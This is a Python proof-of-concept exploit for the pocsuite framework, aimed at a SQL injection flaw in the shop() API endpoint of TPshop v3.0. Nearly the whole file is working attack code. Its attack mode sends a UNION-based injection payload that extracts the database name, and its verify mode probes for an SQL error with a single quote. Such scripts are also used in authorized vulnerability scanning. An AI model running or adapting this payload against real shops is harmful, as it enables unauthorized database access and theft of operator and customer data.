#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'TPshopv3.0 sql injection Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://www.uedbox.com/post/55041/']
    desc = '''tpshopv3.0 /application/home/controller/api.php的shop()存在sql注入'''

    vulDate = '2018-05-13'
    createDate = '2019-05-15'
    updateDate = '2019-05-15'

    appName = 'TPshop'
    appVersion = 'v3.0'
    appPowerLink = 'http://www.tp-shop.cn'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/index.php/home/api/shop/?province_id=1&city_id=2&district_id=1&shop_address=aaaa&latitude=1&longitude=1- latitude)* 111),2))),2) AS distance FROM `tp12` WHERE `deleted` = :where_deleted AND `shop_status` = :where_shop_status AND `province_id` = :where_province_id AND `city_id` = :where_city_id AND `district_id` = :where_district_id AND ( `shop_name` LIKE :where_shop_name OR `shop_address` LIKE :where_shop_address ) UNION(SELECT(database()),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26),(27),(28),(29))%23' 
        resp = req.get(self.url + payload1)
        dbname1 = re.findall("'(.*?).tp12'", resp.content)
        print(dbname1)
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1[1]
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = "/index.php/home/api/shop?province_id=1&city_id=2&district_id=1&shop_address=aaaa&latitude=1&longitude=1'" 
        resp = req.get(self.url + payload1 )
        if 'SQLSTATE[42000]' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

